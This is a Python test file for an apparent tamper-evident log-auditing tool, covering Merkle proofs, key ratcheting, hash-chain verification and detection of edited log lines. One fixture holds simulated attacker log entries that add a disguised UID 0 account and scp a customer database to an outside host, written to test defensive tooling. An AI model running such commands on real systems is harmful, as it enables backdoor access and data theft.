from rootdefense.agent import SourceWatcher
from rootdefense.audit import pair_by_similarity
from rootdefense.core import crypto


def test_pairing_matches_edited_line_not_deleted_one():
    a = ["useradd new user name=sysupdate UID=0", "sudo root COMMAND=/usr/bin/scp customers.db 203.0.113.66:/tmp/"]
    b = ["sudo root COMMAND=/usr/bin/scp customers.db 198.51.100.24:/tmp/"]
    assert pair_by_similarity(a, b) == [(0, None), (1, 0)]


def test_merkle_proofs_all_sizes():
    for n in range(1, 40):
        leaves = [crypto.sha256_hex(str(i).encode()) for i in range(n)]
        root = crypto.merkle_root(leaves)
        for i in range(n):
            proof = crypto.merkle_proof(leaves, i)
            assert crypto.verify_proof(leaves[i], i, n, proof, root)
            assert not crypto.verify_proof(crypto.sha256_hex(b"x"), i, n, proof, root)


def test_ratchet_chain_verifies_and_old_keys_cannot_resign():
    r = crypto.KeyRatchet()
    pk = r.public_hex
    head = crypto.GENESIS_HASH
    entries = []
    for i in range(5):
        e = {"agent_id": "a", "seq": i, "ts": 1.0 + i, "kind": "log", "source": "s", "line_no": i + 1,
             "line_hash": crypto.line_hash(f"line {i}"), "prev_hash": head, "meta": {}}
        r.seal(e)
        entries.append(e)
        head = e["hash"]
    head, expected_pk = crypto.GENESIS_HASH, pk
    for i, e in enumerate(entries):
        assert crypto.check_link(head, e, i, expected_pk).ok
        head, expected_pk = e["hash"], e["next_pk"]
    # An attacker holding today's key cannot produce a valid signature for entry 0.
    forged = dict(entries[0], line_hash=crypto.line_hash("forged"))
    r.seal(forged)
    assert not crypto.check_link(crypto.GENESIS_HASH, forged, 0, pk).ok


def test_editing_an_entry_breaks_the_chain():
    r = crypto.KeyRatchet()
    pk = r.public_hex
    e = {"agent_id": "a", "seq": 0, "ts": 1.0, "kind": "log", "source": "s", "line_no": 1,
         "line_hash": crypto.line_hash("hello"), "prev_hash": crypto.GENESIS_HASH, "meta": {}}
    r.seal(e)
    e["line_hash"] = crypto.line_hash("tampered")
    assert not crypto.check_link(crypto.GENESIS_HASH, e, 0, pk).ok


def test_watcher_detects_append_edit_delete(tmp_path):
    f = tmp_path / "auth.log"
    f.write_text("a\nb\nc\n")
    w = SourceWatcher("auth.log", str(f), [])
    new, ops, _ = w.poll()
    assert [t for _, t in new] == ["a", "b", "c"] and not ops
    w.known += [crypto.line_hash(t) for _, t in new]

    f.write_text("a\nb\nc\nd\n")
    new, ops, _ = w.poll()
    assert new == [(4, "d")] and not ops
    w.known.append(crypto.line_hash("d"))

    f.write_text("a\nB\nd\ne\n")  # b modified + c deleted -> lines 2-3 rewritten as one line; e appended
    new, ops, _ = w.poll()
    assert (5, "e") in new
    assert ops == [{"type": "rewritten", "lines": [2, 3], "now_at": [2, 2]}]

    f.write_text("a\nX\nc\nd\ne\n")  # same number of lines -> plain modification of line 2
    w.known.append(crypto.line_hash("e"))
    _, ops, _ = w.poll()
    assert ops == [{"type": "modified", "lines": [2, 2], "now_at": [2, 2]}]
